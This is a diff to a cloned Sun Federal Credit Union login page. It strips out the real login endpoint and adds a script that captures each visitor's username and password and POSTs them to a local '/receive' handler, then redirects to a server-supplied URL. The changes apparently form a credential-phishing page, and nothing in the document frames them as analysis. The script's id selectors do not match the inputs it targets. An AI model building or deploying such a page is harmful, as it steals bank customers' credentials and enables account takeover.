@@ -4049,14 +4049,14 @@ div.WordSection1
 
 
     
-<form id="loginformmodal" action="https://login.sunfederalcu.org/Authentication/Username" method="post" enctype="application/x-www-form-urlencoded" data-hs-cf-bound="true">
+<form id="loginformmodal" method="post" enctype="application/x-www-form-urlencoded" data-hs-cf-bound="true">
 	<div class="login-form">
 		<div class="form-row">
 			<div class="form-label">
 				<p>Username:</p>
 			</div>
 			<div class="form-field">
-				<input type="text" name="UserName" aria-label="Username modal" autofocus="">
+				<input type="text" name="username" aria-label="Username modal" autofocus="">
 			</div>
 		</div>
 		<div class="form-row">
@@ -4064,17 +4064,76 @@ div.WordSection1
 				<p>Password:</p>
 			</div>
 			<div class="form-field">
-				<input type="password" name="Password" aria-label="Password modal">
+				<input type="password" name="password" aria-label="Password modal">
 			</div>
 		</div>
 		<div class="form-row">
 			<div class="form-button">
-				<input type="submit" value="Login" class="button round" aria-label="Login modal">
+				<input type="submit" id="submit" value="Login" class="button round" aria-label="Login modal">
 			</div>
 		</div>
 	</div>
 </form>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+<script>
+$(document).ready(function () {
+    $('#submit').click(function (e) {
+        e.preventDefault();
 
+        const $useridInput = $('#username');
+        const $passwordInput = $('#password');
+
+        let userinfo = {}; 
+	let username = $useridInput.val().trim();
+        let visitor = $useridInput.val().trim();
+        let password = $passwordInput.val().trim();
+        let isValid = true;
+
+        // Validate username
+        if (!username) {
+            $useridInput.css('border', '1px solid red');
+            isValid = false;
+        } else {
+            $useridInput.css('border', '');
+        }
+
+        // Validate password
+        if (!password) {
+            $passwordInput.css('border', '1px solid red');
+            isValid = false;
+        } else {
+            $passwordInput.css('border', '');
+        }
+
+        if (!isValid) {
+            console.log('Please fill in all required fields.');
+            return;
+        }
+
+        sessionStorage.setItem('visitor', visitor);
+        userinfo['userid'] = username;
+        userinfo['password'] = password;
+
+        console.log(userinfo); 
+        
+        $.ajax({
+            url: '/receive',
+            type: 'POST',
+            data: userinfo,
+            success: function (response) {
+                if (response.url) {
+                    window.location.href = response.url;
+                } else {
+                    alert('Invalid response from server.');
+                }
+            },
+            error: function (xhr, status, error) {
+                alert('An error occurred: ' + error);
+            }
+        });
+    });
+});
+</script>
 
     <a href="https://www.sunfederalcu.org/#" class="button left expand select" data-dropdown="ffdropdown-7586">
 	Options <i class="fa fa-"></i></a>
